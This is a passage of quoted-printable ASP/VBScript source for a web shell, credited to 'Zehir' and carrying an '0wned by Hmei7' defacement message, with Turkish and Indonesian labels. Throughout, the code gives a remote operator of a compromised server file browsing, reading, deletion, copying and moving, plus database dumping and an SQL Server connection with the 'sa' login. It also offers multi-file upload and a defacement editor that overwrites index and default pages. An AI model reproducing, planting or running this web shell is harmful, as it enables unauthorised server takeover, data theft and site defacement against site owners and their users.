request.servervariables(&quot;HTTP_USER_AGENT&quot;) &amp; &quot;&lt;/td&gt=
;&lt;/tr&gt;&quot;
    Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;font color=3Dred&=
gt;Server&lt;/td&gt;&lt;td&gt; &quot; &amp;
request.servervariables(&quot;SERVER_NAME&quot;) &amp; &quot;&lt;/td&gt;&lt=
;/tr&gt;&quot;
    Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;font color=3Dred&=
gt;IP&lt;/td&gt;&lt;td&gt; &quot; &amp;
request.servervariables(&quot;LOCAL_ADDR&quot;) &amp; &quot;&lt;/td&gt;&lt;=
/tr&gt;&quot;
    Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;font color=3Dred&=
gt;HTTPD&lt;/td&gt;&lt;td&gt; &quot; &amp;
request.servervariables(&quot;SERVER_SOFTWARE&quot;) &amp; &quot;&lt;/td&gt=
;&lt;/tr&gt;&quot;
    Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;font color=3Dred&=
gt;Port&lt;/td&gt;&lt;td&gt; &quot; &amp;
request.servervariables(&quot;SERVER_PORT&quot;) &amp; &quot;&lt;/td&gt;&lt=
;/tr&gt;&quot;
    Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;font color=3Dred&=
gt;Yol&lt;/td&gt;&lt;td&gt; &quot; &amp;
request.servervariables(&quot;APPL_PHYSICAL_PATH&quot;) &amp; &quot;&lt;/td=
&gt;&lt;/tr&gt;&quot;
    Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;font color=3Dred&=
gt;Log Root&lt;/td&gt;&lt;td&gt; &quot; &amp;
request.servervariables(&quot;APPL_MD_PATH&quot;) &amp; &quot;&lt;/td&gt;&l=
t;/tr&gt;&quot;
    Response.Write &quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;font color=3Dred&=
gt;HTTPS&lt;/td&gt;&lt;td&gt; &quot; &amp;
request.servervariables(&quot;HTTPS&quot;) &amp; &quot;&lt;/td&gt;&lt;/tr&g=
t;&quot;
    Response.Write &quot;&lt;/table&gt;&quot;
    popup =3D false
CASE 14 'Upload and Search
    aramaUpload
    popup =3D false
    hataKontrol
CASE 15 'Ms. SQL Server
    Response.Write &quot;&lt;form method=3Dget action=3D'&quot;&amp;DosyPat=
h&amp;&quot;' target=3D'_opener'
id=3Dform1 name=3Dform1&gt;&quot;
    Response.Write &quot;&lt;table cellpadding=3D0 cellspacing=3D0 align=3D=
center&gt;&lt;tr&gt;&lt;td
align=3Dcenter&gt;&lt;font size=3D2&gt;Tentukan koneksi SQL Server&lt;/td&g=
t;&lt;/tr&gt;&lt;tr&gt;&lt;td
align=3Dcenter&gt;&quot;
    Response.Write &quot;&lt;input type=3Dhidden value=3D'7' name=3Dstatus&=
gt;&lt;input type=3Dhidden
value=3D'&quot;&amp;time&amp;&quot;' name=3DTime&gt;&quot;
    Response.Write &quot;&lt;input style=3D'width:250; height:21'
value=3D'Provider=3DSQLOLEDB.1;Persist Security Info=3DFalse;User ID=3Dsa;I=
nitial
Catalog=3DNorthwind' name=3Dpath&gt;&lt;br&gt;&quot;
    response.Write &quot;&lt;input type=3Dsubmit value=3D'Explorasi SQL Ser=
ver !!'
style=3D'height:23;width:170' id=3Dsubmit1 name=3Dsubmit1&gt;&quot;
    Response.Write &quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;
    response.Write &quot;&lt;/form&gt;&quot;

    popup =3D false
    hataKontrol
CASE 16 'file Copy window
    Response.Write &quot;&lt;form method=3Dget action=3D'&quot;&amp;DosyPat=
h&amp;&quot;' id=3Dform1
name=3Dform1&gt;&quot;
    Response.Write &quot;&lt;table cellpadding=3D0 cellspacing=3D0 align=3D=
center&gt;&lt;tr&gt;&lt;td
width=3D100&gt;&lt;font size=3D2&gt;Kop. Yer : &lt;/td&gt;&lt;td&gt;&quot;
    Response.Write &quot;&lt;input type=3Dhidden value=3D'17' name=3Dstatus=
&gt;&lt;input
type=3Dhidden value=3D'&quot;&amp;PathFile&amp;&quot;' name=3Dpath&gt;&lt;i=
nput type=3Dhidden value=3D'&quot;&amp;time&amp;&quot;'
name=3DTime&gt;&quot;
    Response.Write &quot;&lt;input style=3D'width:250; height:21' value=3D'=
&quot;&amp;PathFile&amp;&quot;'
name=3Dcf&gt;&quot;
    response.Write &quot;&lt;input type=3Dsubmit value=3D'Kopyala'
style=3D'height:22;width:70' id=3Dsubmit1 name=3Dsubmit1&gt;&quot;
    Response.Write &quot;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=3D3=
 align=3Dcenter&gt;&lt;font size=3D2&gt;&quot;
    response.Write &quot;&lt;input type=3Dradio name=3D'islem' value=3D'kop=
yala'
checked&gt;Kopyala&quot;
    response.Write &quot;&lt;input type=3Dradio name=3D'islem' value=3D'tas=
i'&gt;Tasi&quot;
    response.Write &quot;&lt;/table&gt;&quot;
    response.Write &quot;&lt;/form&gt;&quot;

    popup =3D false
    hataKontrol
CASE 17 'file Copy
    isl =3D &quot;&quot;
    if islem=3D&quot;kopyala&quot; then
        objFSO.CopyFile path,cf
        isl=3D&quot;kopyaland=C3=BD..&quot;
    elseif islem=3D&quot;tasi&quot; then
        objFSO.MoveFile path,cf
        isl=3D&quot;ta=C3=BE=C3=BDnd=C3=BD..&quot;
    end if
    response.Write &quot;Dosya &quot;&amp;isl
    response.Write &quot;&lt;br&gt;&lt;font color=3Dred&gt;Kaynak : &lt;/fo=
nt&gt;&quot;&amp;path&amp;&quot;&lt;br&gt;&lt;font
color=3Dred&gt;Hedef : &lt;/font&gt;&quot;&amp;cf
    response.Write &quot;&lt;br&gt;&quot;
    popup =3D false
    hataKontrol
CASE 18 'folder Copy window
    Response.Write &quot;&lt;form method=3Dget action=3D'&quot;&amp;DosyPat=
h&amp;&quot;' id=3Dform1
name=3Dform1&gt;&quot;
    Response.Write &quot;&lt;table cellpadding=3D0 cellspacing=3D0 align=3D=
center&gt;&lt;tr&gt;&lt;td
width=3D100&gt;&lt;font size=3D2&gt;Kop. Yer : &lt;/td&gt;&lt;td&gt;&quot;
    Response.Write &quot;&lt;input type=3Dhidden value=3D'19' name=3Dstatus=
&gt;&lt;input
type=3Dhidden value=3D'&quot;&amp;PathFile&amp;&quot;' name=3Dpath&gt;&lt;i=
nput type=3Dhidden value=3D'&quot;&amp;time&amp;&quot;'
name=3DTime&gt;&quot;
    Response.Write &quot;&lt;input style=3D'width:250; height:21' value=3D'=
&quot;&amp;PathFile&amp;&quot;'
name=3Dcf&gt;&quot;
    response.Write &quot;&lt;input type=3Dsubmit value=3D'Kopyala'
style=3D'height:22;width:70' id=3Dsubmit1 name=3Dsubmit1&gt;&quot;
    Response.Write &quot;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=3D3=
 align=3Dcenter&gt;&lt;font size=3D2&gt;&quot;
    response.Write &quot;&lt;input type=3Dradio name=3D'islem' value=3D'kop=
yala'
checked&gt;Kopyala&quot;
    response.Write &quot;&lt;input type=3Dradio name=3D'islem' value=3D'tas=
i'&gt;Tasi&quot;
    response.Write &quot;&lt;/table&gt;&quot;
    response.Write &quot;&lt;/form&gt;&quot;

    popup =3D false
    hataKontrol
CASE 19 'folder Copy
    isl =3D &quot;&quot;
    if islem=3D&quot;kopyala&quot; then
        objFSO.CopyFolder path,cf
        isl=3D&quot;kopyaland=C3=BD..&quot;
    elseif islem=3D&quot;tasi&quot; then
        objFSO.MoveFolder path,cf
        isl=3D&quot;ta=C3=BE=C3=BDnd=C3=BD..&quot;
    end if
    response.Write &quot;Klasor &quot;&amp;isl
    response.Write &quot;&lt;br&gt;&lt;font color=3Dred&gt;Kaynak : &lt;/fo=
nt&gt;&quot;&amp;path&amp;&quot;&lt;br&gt;&lt;font
color=3Dred&gt;Hedef : &lt;/font&gt;&quot;&amp;cf
    response.Write &quot;&lt;br&gt;&quot;
    popup =3D false
    hataKontrol
CASE 33 'Powered By
    response.Write &quot;&lt;body topmargin=3D5 leftmargin=3D0&gt;&lt;cente=
r&gt;&lt;h4&gt;Powered by
Zehir&quot;
    response.Write &quot;&lt;br&gt;&lt;br&gt;&lt;font style=3D'FONT-WEIGHT:=
normal'
size=3D2&gt;<a href=3D"mailto:zehirhacker&#64;hotmail.com">zehirhacker&#64;=
hotmail.com</a>&lt;br&gt;&lt;font color=3Dyellow face=3D'courier new'&gt;&q=
uot;
    popup =3D false
    hataKontrol
CASE 40 'Sistem Test
    sistemTest
    popup=3Dfalse
CASE 50 'Siteleri Test Edelim :D
    %&gt;
    &lt;table width=3D&quot;100%&quot; cellpadding=3D0 cellspacing=3D0&gt;
        &lt;tr&gt;
            &lt;td align=3Dcenter&gt;
                &lt;b&gt;Sebaiknya jangan dilakukan yah...&lt;/b&gt;&lt;br&=
gt;
                &lt;b&gt;(hanya bisa dijalankan di internet explorer)&lt;/b=
&gt;&lt;BR&gt;
                &lt;br&gt;
                &lt;form action=3D&quot;&lt;%=3DdosyaPath%&gt;&quot; method=
=3Dpost id=3DfrmMesaj&gt;
                    &lt;input type=3Dhidden name=3Dkuskapani value=3D2&gt;
                    &lt;table width=3D500 align=3Dcenter border=3D1 cellpad=
ding=3D0
cellspacing=3D0&gt;
                        &lt;tr&gt;
                            &lt;td width=3D100&gt;Path&lt;/td&gt;
                            &lt;td&gt;&lt;input style=3D&quot;width:100%&qu=
ot; type=3Dtext name=3D&quot;Path&quot;
id=3D&quot;Path&quot; value=3D&quot;&lt;%=3Dpath%&gt;&quot;&gt;&lt;/td&gt;
                        &lt;/tr&gt;
                        &lt;tr&gt;
                            &lt;td width=3D100&gt;Sub Folder&lt;/td&gt;
                            &lt;td&gt;&lt;input style=3D&quot;width:100%&qu=
ot; type=3Dtext
name=3D&quot;SubFolder&quot; id=3D&quot;SubFolder&quot; value=3D&quot;&quot=
;&gt;&lt;/td&gt;
                        &lt;/tr&gt;
                        &lt;tr&gt;
                            &lt;td width=3D100&gt;File Name&lt;/td&gt;
                            &lt;td&gt;&lt;input style=3D&quot;width:100%&qu=
ot; type=3Dtext
name=3D&quot;FileName&quot; id=3D&quot;FileName&quot; value=3D&quot;indones=
ia.htm&quot;&gt;&lt;/td&gt;
                        &lt;/tr&gt;
                        &lt;tr&gt;
                            &lt;td colspan=3D2&gt;
                                &lt;table width=3D&quot;100%&quot; align=3D=
center&gt;
                                    &lt;tr&gt;
                                        &lt;td width=3D&quot;50%&quot;&gt;
                                            &lt;input type=3Dcheckbox name=
=3D&quot;dosya1&quot;
checked ID=3D&quot;Checkbox1&quot;&gt;index.htm&lt;br&gt;
                                            &lt;input type=3Dcheckbox name=
=3D&quot;dosya2&quot;
checked ID=3D&quot;Checkbox2&quot;&gt;index.html&lt;br&gt;
                                            &lt;input type=3Dcheckbox name=
=3D&quot;dosya5&quot;
checked ID=3D&quot;Checkbox2&quot;&gt;index.php&lt;br&gt;
                                        &lt;/td&gt;
                                        &lt;td width=3D&quot;50%&quot;&gt;
                                            &lt;input type=3Dcheckbox name=
=3D&quot;dosya3&quot;
checked ID=3D&quot;Checkbox3&quot;&gt;index.asp&lt;br&gt;
                                            &lt;input type=3Dcheckbox name=
=3D&quot;dosya4&quot;
checked ID=3D&quot;Checkbox4&quot;&gt;default.asp&lt;br&gt;
                                            &lt;input type=3Dcheckbox name=
=3D&quot;dosya6&quot;
checked ID=3D&quot;Checkbox2&quot;&gt;default.html&lt;br&gt;
                                        &lt;/td&gt;
                                    &lt;/tr&gt;
                                &lt;/table&gt;
                            &lt;/td&gt;
                        &lt;/tr&gt;
                        &lt;tr&gt;
                            &lt;td colspan=3D2 align=3Dcenter&gt;
                                &lt;a href=3D&quot;#&quot; onClick=3D&quot;=
FormatText('cut')&quot;
alt=3D&quot;Kes&quot;&gt;Hapus&lt;/a&gt;
                                &lt;a href=3D&quot;#&quot; onClick=3D&quot;=
FormatText('copy')&quot;
alt=3D&quot;Kopyala&quot;&gt;salin&lt;/a&gt;
                                &lt;a href=3D&quot;#&quot; onClick=3D&quot;=
FormatText('paste')&quot;
alt=3D&quot;Yap=C3=BD=C3=BEt=C3=BDr&quot;&gt;paste&lt;/a&gt;
                                &lt;a href=3D&quot;#&quot; alt=3D&quot;Kal=
=C3=BDn&quot;
onClick=3D&quot;FormatText('bold', '')&quot;&gt;Bold&lt;/a&gt;
                                &lt;a href=3D&quot;#&quot; alt=3D&quot;=C3=
=9Dtalic&quot;
onClick=3D&quot;FormatText('italic', '')&quot;&gt;Italic&lt;/a&gt;
                                &lt;a href=3D&quot;#&quot; alt=3D&quot;Alt=
=C3=BD =C3=87izili&quot;
onClick=3D&quot;FormatText('underline', '')&quot;&gt;UnderLine&lt;/a&gt;
                                &lt;a href=3D&quot;#&quot; onClick=3D&quot;=
FormatText('JustifyLeft',
'')&quot; alt=3D&quot;Sola Hizal=C3=BD&quot;&gt;JustifyLeft&lt;/a&gt;
                                &lt;a href=3D&quot;#&quot; alt=3D&quot;Orta=
da Hizal=C3=BD&quot;
onClick=3D&quot;FormatText('JustifyCenter', '')&quot;&gt;JustifyCenter&lt;/=
a&gt;
                                &lt;a href=3D&quot;#&quot; onClick=3D&quot;=
FormatText('JustifyRight',
'')&quot; alt=3D&quot;Sa=C3=B0a Hizal=C3=BD&quot;&gt;JustifyRight&lt;/a&gt;
                                &lt;a href=3D&quot;#&quot; alt=3D&quot;Web =
Sitesi Linki Ekle&quot;
onClick=3D&quot;FormatText('createLink')&quot;&gt;AddLink&lt;/a&gt;
                                &lt;a href=3D&quot;#&quot; alt=3D&quot;Resi=
m Ekle&quot;
onClick=3D&quot;AddImage()&quot;&gt;AddImage&lt;/a&gt;
                                &lt;select name=3D&quot;selectColour&quot;
onChange=3D&quot;bgc(selectColour.options[selectColour.selectedIndex].value=
);&quot;
ID=3D&quot;selectColour&quot;&gt;
                                  &lt;option value=3D&quot;0&quot; selected=
&gt;-- Background
--&lt;/option&gt;
                                  &lt;option value=3D&quot;black&quot;&gt;S=
iyah&lt;/option&gt;
                                  &lt;option value=3D&quot;white&quot;&gt;B=
eyaz&lt;/option&gt;
                                  &lt;option value=3D&quot;blue&quot;&gt;Ma=
vi&lt;/option&gt;
                                  &lt;option value=3D&quot;red&quot;&gt;K=
=C3=BDrm=C3=BDz=C3=BD&lt;/option&gt;
                                  &lt;option value=3D&quot;green&quot;&gt;Y=
e=C3=BEil&lt;/option&gt;
                                  &lt;option value=3D&quot;yellow&quot;&gt;=
Sar=C3=BD&lt;/option&gt;
                                  &lt;option value=3D&quot;orange&quot;&gt;=
Turuncu&lt;/option&gt;
                                  &lt;option value=3D&quot;brown&quot;&gt;K=
ahverengi&lt;/option&gt;
                                  &lt;option value=3D&quot;magenta&quot;&gt=
;Pembe&lt;/option&gt;
                                  &lt;option value=3D&quot;cyan&quot;&gt;A=
=C3=A7=C3=BDk Mavi&lt;/option&gt;
                                  &lt;option value=3D&quot;limegreen&quot;&=
gt;A=C3=A7=C3=BDk Ye=C3=BEil&lt;/option&gt;
                                &lt;/select&gt;
                                &lt;select name=3D&quot;a&quot;
onChange=3D&quot;FormatText('ForeColor', a.options[a.selectedIndex].value);=
&quot; ID=3D&quot;a&quot;&gt;
                                  &lt;option value=3D&quot;0&quot; selected=
&gt;-- Warna huruf
--&lt;/option&gt;
                                  &lt;option value=3D&quot;black&quot;&gt;S=
iyah&lt;/option&gt;
                                  &lt;option value=3D&quot;white&quot;&gt;B=
eyaz&lt;/option&gt;
                                  &lt;option value=3D&quot;blue&quot;&gt;Ma=
vi&lt;/option&gt;
                                  &lt;option value=3D&quot;red&quot;&gt;K=
=C3=BDrm=C3=BDz=C3=BD&lt;/option&gt;
                                  &lt;option value=3D&quot;green&quot;&gt;Y=
e=C3=BEil&lt;/option&gt;
                                  &lt;option value=3D&quot;yellow&quot;&gt;=
Sar=C3=BD&lt;/option&gt;
                                  &lt;option value=3D&quot;orange&quot;&gt;=
Turuncu&lt;/option&gt;
                                  &lt;option value=3D&quot;brown&quot;&gt;K=
ahverengi&lt;/option&gt;
                                  &lt;option value=3D&quot;magenta&quot;&gt=
;Pembe&lt;/option&gt;
                                  &lt;option value=3D&quot;cyan&quot;&gt;A=
=C3=A7=C3=BDk Mavi&lt;/option&gt;
                                  &lt;option value=3D&quot;limegreen&quot;&=
gt;A=C3=A7=C3=BDk Ye=C3=BEil&lt;/option&gt;
                                &lt;/select&gt;
                                &lt;select name=3D&quot;selectSize&quot;
onChange=3D&quot;FormatText('fontsize',
selectSize.options[selectSize.selectedIndex].value);&quot;&gt;
                                  &lt;option selected&gt;-- Ukuran huruf --=
&lt;/option&gt;
                                  &lt;option value=3D&quot;1&quot;&gt;1&lt;=
/option&gt;
                                  &lt;option value=3D&quot;2&quot;&gt;2&lt;=
/option&gt;
                                  &lt;option value=3D&quot;3&quot;&gt;3&lt;=
/option&gt;
                                  &lt;option value=3D&quot;4&quot;&gt;4&lt;=
/option&gt;
                                  &lt;option value=3D&quot;5&quot;&gt;5&lt;=
/option&gt;
                                  &lt;option value=3D&quot;6&quot;&gt;6&lt;=
/option&gt;
                                &lt;/select&gt;
                                &lt;iframe width=3D&quot;100%&quot;
src=3D&quot;&lt;%=3DdosyaPath%&gt;?kuskapani=3D1&quot; id=3D&quot;byZehir&q=
uot; name=3D&quot;&lt;%=3DSession(&quot;n1&quot;)%&gt;&quot;&gt;0wned
by Hmei7,please don't delete this file until next Idul Fitri,  ;)&lt;/ifram=
e&gt;
                                &lt;script language=3Djavascript&gt;
                                    frames.byZehir.document.designMode =3D =
&quot;On&quot;;
                                    function bgc(option){
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
=20=20=20=20=20=20=20=20=20=20=20=20=20=20
frames.byZehir.document.body.bgColor=3Doption;
                                    }
                                    function FormatText(command, option){
                                        frames.byZehir.focus();
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
frames.byZehir.document.execCommand(command, false, option);
                                          frames.byZehir.focus();
                                    }
                                    function AddImage(){
                                        imagePath =3D prompt('Eklemek isted=
i=C3=B0iniz
resmin web adresini yaz=C3=BDn', 'http://');

                                        if ((imagePath !=3D null) &amp;&amp=
; (imagePath
!=3D &quot;&quot;)){
                                            frames.byZehir.focus();
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
frames.byZehir.document.execCommand('InsertImage', false, imagePath);
                                        }
                                        frames.byZehir.focus();
                                    }
                                &lt;/script&gt;
                                &lt;input type=3Dhidden value=3D&quot;&quot=
; id=3DbyMesaj
name=3DbyMesaj&gt;
                                &lt;input type=3Dsubmit value=3D&quot;Laksa=
nakan..&quot;
onclick=3D&quot;document.all['byMesaj'].value=3Dframes['byZehir'].document.=
body.innerHTML;
alert(document.all['byMesaj'].value);&quot;&gt;
                            &lt;/td&gt;
                        &lt;/tr&gt;
                    &lt;/table&gt;
                &lt;/form&gt;
            &lt;/td&gt;
        &lt;/tr&gt;
    &lt;/table&gt;
    &lt;%
    popup=3Dfalse
CASE 51 ' =C3=96zel =C3=BEilemler
END SELECT
%&gt;
&lt;script language=3Djavascript&gt;
    function NewWindow(mypage, myname, w, h, scroll) {
        var winl =3D (screen.width - w) / 2;
        var wint =3D (screen.height - h) / 2;
            winprops =3D
'height=3D'+h+',width=3D'+w+',top=3D'+wint+',left=3D'+winl+',scrollbars=3D'=
+scroll+',resizable'
        win =3D window.open(mypage, myname, winprops)
        if (parseInt(navigator.appVersion) &gt;=3D 4) { win.window.focus();=
 }
    }
    function ffd(yol){
        NewWindow(yol,&quot;&quot;,420,100,&quot;no&quot;);
    }
&lt;/script&gt;
&lt;body bgcolor=3Dblack text=3DChartreuse link=3DChartreuse alink=3DChartr=
euse
vlink=3DChartreuse&gt;
&lt;%
if popup then
    if status=3D7 or status=3D8 then
        Response.Write &quot;&lt;form method=3Dget action=3D'&quot;&amp;Dos=
yPath&amp;&quot;' id=3Dform1
name=3Dform1&gt;&quot;
        Response.Write &quot;&lt;table border=3D1 cellpadding=3D0 cellspaci=
ng=3D0
align=3Dcenter&gt;&lt;tr&gt;&lt;td width=3D100 bgcolor=3Dgray&gt;&lt;font s=
ize=3D2&gt;SQL Query&lt;/td&gt;&lt;td&gt;&quot;
        Response.Write &quot;&lt;input type=3Dhidden value=3D'9' name=3Dsta=
tus&gt;&lt;input
type=3Dhidden value=3D'&quot;&amp;path&amp;&quot;' name=3Dpath&gt;&lt;input=
 type=3Dhidden value=3D'&quot;&amp;time&amp;&quot;'
name=3DTime&gt;&quot;
        Response.Write &quot;&lt;input style=3D'width:350; height:21' value=
=3D''
name=3DstrSQL&gt;&lt;input type=3Dsubmit value=3D'Query' style=3D'height:22=
;width:70'
id=3Dsubmit1 name=3Dsubmit1&gt;&quot;
        Response.Write &quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&=
gt;&quot;
    end if
    Response.Write &quot;&lt;form method=3Dget action=3D'&quot;&amp;DosyPat=
h&amp;&quot;'&gt;&quot;
    Response.Write &quot;&lt;table border=3D1 cellpadding=3D0 cellspacing=
=3D0
align=3Dcenter&gt;&lt;tr&gt;&lt;td bgcolor=3Dgray width=3D100&gt;&lt;font s=
ize=3D2&gt;Path : &lt;/td&gt;&lt;td&gt;&quot;
    Response.Write &quot;&lt;input type=3Dhidden value=3D'2' name=3Dstatus&=
gt;&lt;input type=3Dhidden
value=3D'&quot;&amp;time&amp;&quot;' name=3DTime&gt;&quot;
    Response.Write &quot;&lt;input style=3D'width:350; height:21' value=3D'=
&quot;&amp;Path&amp;&quot;'
name=3DPath&gt;&lt;input type=3Dsubmit value=3D'Tampilkan' style=3D'height:=
22;width:70'
id=3Dsubmit1 name=3Dsubmit1&gt;&quot;
    Response.Write &quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&=
lt;br&gt;&quot;
end if
sub aramaUpload
Response.Write &quot;&lt;form method=3Dget target=3D'_opener' action=3D'&qu=
ot;&amp;DosyPath&amp;&quot;'&gt;&quot;
Response.Write &quot;&lt;table widht=3D'100%' border=3D0 cellpadding=3D0
cellspacing=3D0&gt;&lt;tr&gt;&lt;td width=3D70&gt;&lt;font size=3D2&gt;Penc=
arian: &lt;/td&gt;&lt;td&gt;&quot;
Response.Write &quot;&amp;nbsp;&lt;input type=3Dhidden value=3D'12' name=3D=
status&gt;&lt;input
type=3Dhidden value=3D'&quot;&amp;time&amp;&quot;' name=3DTime&gt;&quot;
Response.Write &quot;&lt;input type=3Dhidden value=3D'&quot;&amp;Path&amp;&=
quot;' name=3DPath&gt;&lt;input
style=3D'width:250' value=3D'mdb' name=3DtxArama&gt;&lt;input style=3D'widt=
h:70; height:22'
type=3Dsubmit value=3D'Cari'&gt;&quot;
Response.Write &quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&quot;
%&gt;
&lt;form name=3DfrmUpload method=3Dpost enctype=3D&quot;multipart/form-data=
&quot;
action=3D&quot;&lt;%=3DDosyaPath&amp;&quot;?status=3D-4&amp;Time=3D&quot;&a=
mp;time&amp;&quot;&amp;Path=3D&quot;&amp;path%&gt;&quot; ID=3D&quot;Form1&q=
uot;&gt;
&lt;input type=3Dhidden name=3Dfolder value=3D&quot;&lt;%=3DPath%&gt;&quot;=
 ID=3D&quot;Hidden1&quot;&gt;
Max: &lt;input type=3Dtext name=3Dmax value=3D5 size=3D5 ID=3D&quot;Text1&q=
uot;&gt; &lt;input type=3Dbutton
value=3D&quot;Tampilkan&quot; onclick=3D&quot;setid()&quot; ID=3D&quot;Butt=
on1&quot; NAME=3D&quot;Button1&quot;&gt;
&lt;table ID=3D&quot;Table1&quot;&gt;
&lt;tr&gt;
&lt;td id=3Dupid&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;input type=3Dsubmit value=3DUpload ID=3D&quot;Submit1&quot; NAME=3D&quo=
t;Submit1&quot;&gt;
&lt;/form&gt;
&lt;script&gt;
setid();

function setid() {
    str=3D'';
    if (frmUpload.max.value&lt;=3D0) frmUpload.max.value=3D1;
    for (i=3D1; i&lt;=3DfrmUpload.max.value; i++) str+=3D'File '+i+': &lt;i=
nput type=3Dfile
name=3Dfile'+i+'&gt;&lt;br&gt;';
    upid.innerHTML=3Dstr+'&lt;br&gt;';
}
&lt;/script&gt;
&lt;%
end sub

SELECT CASE status
CASE 1 'Driver Open
    if len(path)=3D1 then Response.Write (yaziyomu(path&amp;&quot;:\&quot;)=
) else
Response.Write (yaziyomu(path))
    Response.Write &quot;&lt;table width=3D100% &gt;&lt;tr&gt;&quot;
    Path =3D Path &amp; &quot;:/&quot;
    Response.Write &quot;&lt;td valign=3Dtop&gt;&quot;
    KlasorOku
    Response.Write &quot;&lt;/td&gt;&lt;td valign=3Dtop align=3Dright&gt;&q=
uot;
    DosyaOku
    Response.Write &quot;&lt;/td&gt;&quot;
    hataKontrol
CASE 2 'Normal listeleme
    if len(path)=3D1 then Response.Write (yaziyomu(path&amp;&quot;:\&quot;)=
) else
Response.Write (yaziyomu(path))
    Response.Write &quot;&lt;table width=3D100% &gt;&lt;tr&gt;&quot;
    Response.Write &quot;&lt;td valign=3Dtop&gt;&quot;
    KlasorOku
    Response.Write &quot;&lt;/td&gt;&lt;td valign=3Dtop align=3Dright&gt;&q=
uot;
    DosyaOku
    Response.Write &quot;&lt;/td&gt;&quot;
    hataKontrol
CASE 3 'File Delete
    objFSO.DeleteFile del
    hataKontrol
    if err&lt;&gt;0 then
        byMsg=3D&quot;&lt;font color=3Dred&gt;Not File Deleted!&lt;/font&gt=
;&lt;br&gt;&quot;
    else
        byMsg=3D&quot;&lt;font color=3Dyellow&gt;File Deleted Successful;)&=
lt;/font&gt;&lt;br&gt;&quot;
    end if
    Response.Redirect
dosyaPath&amp;&quot;?status=3D2&amp;path=3D&quot;&amp;path&amp;&quot;&amp;T=
ime=3D&quot;&amp;time&amp;&quot;&amp;byMsg=3D&quot;&amp;byMsg
CASE 4 'Folder Delete
    objFSO.DeleteFolder del
    hataKontrol
    if err&lt;&gt;0 then
        byMsg=3D&quot;&lt;font color=3Dred&gt;Not Folder Deleted!&lt;/font&=
gt;&lt;br&gt;&quot;
    else
        byMsg=3D&quot;&lt;font color=3Dyellow&gt;Folder Deleted Successful;=
)&lt;/font&gt;&lt;br&gt;&quot;
    end if
    Response.Redirect
dosyaPath&amp;&quot;?status=3D2&amp;path=3D&quot;&amp;path&amp;&quot;&amp;T=
ime=3D&quot;&amp;time&amp;&quot;&amp;byMsg=3D&quot;&amp;byMsg
CASE 5 'Dosya i=C3=A7eri=C3=B0ini g=C3=B6r=C3=BCnt=C3=BCle
    Response.Write &quot;&lt;center&gt;&lt;b&gt;&lt;font
color=3Dorange&gt;&quot;&amp;path&amp;&quot;&lt;/font&gt;&lt;/b&gt;&lt;/cen=
ter&gt;&lt;br&gt;&quot;
    Response.Write &quot;&lt;table width=3D100% &gt;&lt;tr&gt;&lt;td&gt;&qu=
ot;
    set f =3D objFSO.OpenTextFile(path,1)
    Response.Write &quot;&lt;pre&gt;&quot;&amp;Server.HTMLEncode(f.readAll)=
&amp;&quot;&lt;/pre&gt;&quot;
    if err&lt;&gt;62 then hataKontrol
    if err.number=3D62 then Response.Write &quot;&lt;script language=3Djava=
script&gt;alert('Bu
Dosya Okunam=C3=BDyor\nSistem dosyas=C3=BD olabilir')&lt;/script&gt;&quot;:=
Response.End
CASE 6 'Resim a=C3=A7
    Response.Write &quot;&lt;center&gt;&lt;img ALT=3D'' src=3D'&quot;&amp;r=
esimYol(path)&amp;&quot;'&gt;&lt;/center&gt;&lt;br&gt;&quot;
CASE 7 'database tablo listele
    Response.Write &quot;&lt;b&gt;&lt;font size=3D3&gt;Nama-nama tabel&lt;/=
font&gt;&lt;/br&gt;&lt;br&gt;&quot;
    Set objConn =3D Server.CreateObject(&quot;ADODB.Connection&quot;)
    Set objADOX =3D Server.CreateObject(&quot;ADOX.Catalog&quot;)
    objConn.Provider =3D &quot;Microsoft.Jet.Oledb.4.0&quot;
    objConn.ConnectionString =3D Path
    objConn.Open
    objADOX.ActiveConnection =3D objConn

    For Each table in objADOX.Tables
        If table.Type =3D &quot;TABLE&quot; Then
            Response.Write &quot;&lt;font face=3Dwingdings size=3D5&gt;4&lt=
;/font&gt; &lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D8&amp;Path=3D&quot;&amp;pa=
th&amp;&quot;&amp;table=3D&quot;&amp;table.Name&amp;&quot;&amp;time=3D&quot=
;&amp;time&amp;&quot;'&gt;&quot;&amp;table.Name&amp;&quot;&lt;/a&gt;&lt;br&=
gt;&quot;
        End If
    Next
    hataKontrol
CASE 8 'database kay=C3=BDt listele
    Set objConn =3D Server.CreateObject(&quot;ADODB.Connection&quot;)
    Set objRcs =3D Server.CreateObject(&quot;ADODB.RecordSet&quot;)
    objConn.Provider =3D &quot;Microsoft.Jet.Oledb.4.0&quot;
    objConn.ConnectionString =3D Path
    objConn.Open
    objRcs.Open table,objConn, adOpenKeyset , , adCmdText

    Response.Write &quot;&lt;table border=3D1 cellpadding=3D2 cellspacing=
=3D0
bordercolor=3D543152&gt;&lt;tr bgcolor=3Dsilver&gt;&quot;
    for i=3D0 to objRcs.Fields.count-1
        Response.Write &quot;&lt;td&gt;&lt;font
